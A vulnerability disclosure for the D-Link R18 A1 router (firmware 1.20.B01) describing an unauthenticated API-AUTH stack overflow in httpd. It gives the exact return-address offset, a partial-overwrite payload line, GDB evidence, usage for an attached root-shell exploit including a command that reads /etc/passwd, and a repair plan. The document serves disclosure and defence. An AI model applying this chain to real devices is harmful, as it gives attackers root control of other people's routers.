# D-Link R18 A1 `API-AUTH` Unauthenticated Stack Overflow Leading to Root RCE

## Title

D-Link R18 A1 1.20.B01 `API-AUTH` Unauthenticated Stack-Based Buffer Overflow and Root Remote Code Execution Through Code Reuse

## Description

### 1. Vulnerability Name

An unauthenticated stack-based buffer overflow in the `API-AUTH` hash field allows saved-return-address control and code reuse in `httpd`, leading to execution of an existing Telnet command block and a UID 0 shell under the default configuration.

### 2. Vulnerability Contributor and Submitter

- **Researcher**: Lumina
- **Contact**: 1547800591@qq.com

### 3. Vendor and Product Information

- **Vendor**: D-Link Corporation
- **Vendor homepage**: https://www.dlink.com/
- **Product**: D-Link R18 A1 Router Operating System
- **Component**: DHMAPI authentication logic, `/bin/httpd`
- **Vulnerable function**: `is_session_valid` at `0x42b608`
- **Affected header**: `API-AUTH`
- **Affected field**: The hash token before the first space

![image-20261105152537864](R18A1-FW120B01-API-AUTH-stack-overflow-RCE.EN.assets/image-20261105152537864.png)

### 4. Affected Version

- **Firmware**: `1.20.B01` (`R18A1_FW120B01.bin`)
- **Runtime version string**: `1.20.01`
- **Firmware SHA-256**: `3d6eba2059034d4148543acb7894c81633ce406756287eba2573d323a785a01d`
- **Decrypted firmware SHA-256**: `11cfca751130b979bad3d00cb8b442bd91fd54c134b290070fed6b195a38db24`
- **`httpd` SHA-256**: `a73f1bf1a4cb8bc86d7b2e34a50dcb54dce559a001455b4f6942294b72f43cc3`
- **Architecture**: MIPS32 little-endian, uClibc, Linux 3.18.21

### 5. Vulnerability Class and Attack Conditions

- **Vulnerability class**: Stack-based buffer overflow and control-flow hijacking
- **CWE**: CWE-121 (Stack-based Buffer Overflow)
- **Attack vector**: Adjacent network by default, or remote networks if the management interface is exposed
- **Authentication required**: No; an unauthenticated login-challenge cookie is sufficient
- **User interaction required**: No
- **Privileges gained**: Root (`uid=0`) through the default Telnet account configuration

### 6. Severity

An unauthenticated attacker can overwrite the saved MIPS return address and redirect execution to an existing command-execution block in the non-PIE `httpd` image. The demonstrated chain starts Telnet without using the separate hidden-URL vulnerability and provides an interactive UID 0 shell in the default configuration. This results in complete router compromise.

### 7. Vulnerability Description

The vulnerability is reached in two stages:

1. Send `Login` with `Action=request`. The server returns a `Cookie`, `Challenge`, and `PublicKey` without requesting proof of the administrator password.
2. Send an authenticated-action request with that cookie and an oversized `API-AUTH` hash token. `is_session_valid` copies the token into a 68-byte stack buffer before performing the HMAC comparison.

The hash-token buffer begins at `$sp+0x7c`; saved `$ra` is stored at `$sp+0x2e4`. The saved-return-address offset is therefore `0x268`, or **616 bytes** from the start of the hash token.

### 8. Technical Details and Root Cause

#### Pre-authentication session reachability

`serv_11` at `0x4288e8` locates the challenge session and calls `is_session_valid`. The challenge cookie identifies the session, but no successful `Action=login` request or password proof is required before the vulnerable parser runs.

The relevant logic is equivalent to:

```c
char timestamp[16];
char expected[68];
char supplied[68];

while (auth[i] != ' ')
    supplied[i] = auth[i];
supplied[i] = 0;
/* HMAC comparison happens only after the unbounded copies. */
```

The timestamp field is also copied without a length check into a 16-byte buffer. The validated exploit uses the hash-token overflow because it provides a direct early-return path before HMAC verification.

#### GDB confirmation

A 620-byte cyclic hash token followed by ` 1` produced:

```text
Thread 2 "httpd" received signal SIGSEGV, Segmentation fault.
0x67616165 in ?? ()
s0 = 0x66616178
s1 = 0x66616179
s2 = 0x6761617a
s3 = 0x67616162
s4 = 0x67616163
s5 = 0x67616164
ra = 0x67616165
pc = 0x67616165
```

The little-endian bytes of `0x67616165` are `eaag`, which occur at cyclic offset 616. This establishes precise saved-`$ra` control rather than a generic crash.

#### Partial overwrite and code reuse

HTTP header strings cannot contain embedded NUL bytes. The exploit therefore overwrites only the low three bytes of saved `$ra`:

```python
payload = b"A" * 616 + struct.pack("<I", 0x40C8FC)[:3]
```

The parser's terminating NUL supplies the fourth byte, producing `0x0040c8fc`. A following space and timestamp `1` make the function return before HMAC comparison.

The destination is an existing basic block in the non-PIE `httpd` executable. It prepares `_exec_cmd` arguments and reaches calls at `0x40c924` and `0x40c964`, ultimately executing:

```text
killall -9 telnetd; telnetd -b 0.0.0.0 -p 23
```

This path does not evaluate `enable_dbg_flag` and does not request the F1 URLs `/283d9` or `/tj6hji4`. The proof of concept reuses a fixed existing command block; it does not claim a general-purpose arbitrary-address ROP chain. Once the default Telnet shell is available, arbitrary UID 0 commands can be executed interactively or through the exploit's `--command` option.

### 9. Proof of Concept

The self-contained Python 3 RCE exploit uses only the standard library. It checks that no UID 0 Telnet shell is already available, obtains a challenge-only cookie, performs the partial saved-`$ra` overwrite, and executes a command through the resulting shell:

```bash
python3 ./r18_f4_api_auth_rce.py
```

The default target uses the authorized VM forwarding endpoints:

- Web: `192.168.135.137:18080`
- Telnet verification: `192.168.135.137:18023`

For direct access from inside the emulation VM:

```bash
python3 ./r18_f4_api_auth_rce.py \
  --host 192.168.0.1 --web-port 80 --telnet-port 23
```

To execute a custom command after exploitation:

```bash
python3 ./r18_f4_api_auth_rce.py --command "cat /etc/passwd"
```

The exploit appends `; id` to the command to verify UID 0. A `RemoteDisconnected` result for the overflowing HTTP request is expected. If a UID 0 Telnet shell already exists, the exploit intentionally stops to avoid confusing another vulnerability or an earlier run with F4.

Observed result from the final host-side test:

```text
[+] Challenge-only request returned HTTP 200; no password submitted
[*] Sending 619-byte API-AUTH hash; partial saved-RA overwrite=0x40c8fc
[*] Overflow connection result: RemoteDisconnected: Remote end closed connection without response
R18_F4_RCE_OK
uid=0(root) gid=0(root) groups=0(root)
[+] F4 RCE succeeded: API-AUTH saved-RA control produced a UID 0 shell
```

![image-20261105191031797](R18A1-FW120B01-API-AUTH-stack-overflow-RCE.EN.assets/image-20261105191031797.png)

### 10. Impact

Successful exploitation bypasses the intended Web authentication boundary, executes commands as root through the resulting Telnet shell, and permits complete device compromise. Possible consequences include credential and configuration theft, persistent modification, traffic interception, attacks on LAN clients, and denial of service. The exploit uses fixed main-executable addresses and does not require a libc base disclosure for the demonstrated chain.

### 11. Repair Plan

1. Enforce the exact `API-AUTH` format and reject oversized hash or timestamp fields before any copy.
2. Replace manual unbounded loops with bounded operations and enable stack protectors.
3. Complete signature verification before modifying session state or processing attacker-controlled authentication data.
4. Remove factory-debug command blocks from production firmware so that they cannot be reused during control-flow hijacking.
5. Enable PIE and ASLR as defense in depth, while treating memory-safety correction as the primary fix.
6. Add regression tests using challenge-only sessions and oversized authentication headers.

### 12. Verification and Disclosure Notes

- **Evidence level**: VALIDATED through end-to-end RCE in full-system FirmAE/QEMU emulation; GDB also confirmed exact saved-return-address control.
- The Web frontend and original `httpd` backend were running. No vulnerable or authentication function was patched.
- The RCE test explicitly closed Telnet first and did not invoke the F1 hidden URLs.
- VM forwarding ports `18080` and `18023` only provide host access to target ports `80` and `23`.
- The interactive UID 0 result depends on the default passwordless `admin` configuration. The stack overflow and fixed-command execution do not depend on knowing an administrator password.

The following supporting files are attached:

- `exploits/r18_f4_api_auth_rce.py` — self-contained one-click RCE exploit and UID 0 verification.
- `r18_deep_analysis/gdb_auth_overflow.log` — GDB register evidence for the cyclic overflow.
